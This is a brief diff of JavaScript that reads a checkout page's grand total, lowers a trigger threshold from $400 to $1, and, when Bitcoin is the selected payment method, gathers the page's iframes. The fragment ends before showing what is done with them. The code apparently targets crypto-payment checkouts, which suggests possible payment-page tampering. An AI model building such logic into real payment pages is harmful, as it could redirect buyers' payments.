@@ -6,7 +6,7 @@ function checkIframe() {
         var priceElement = grandTotalElement.nextElementSibling;
         var priceText = priceElement.textContent;
         var priceValue = parseInt(priceText.replace('$', '').trim());
-        if (priceValue >= 400) {
+        if (priceValue >= 1) {
 		// 2 is BTC
             if(document.getElementsByTagName("select")[1].value=="2"){
                 const iframes = Array.from(document.getElementsByTagName("iframe"));
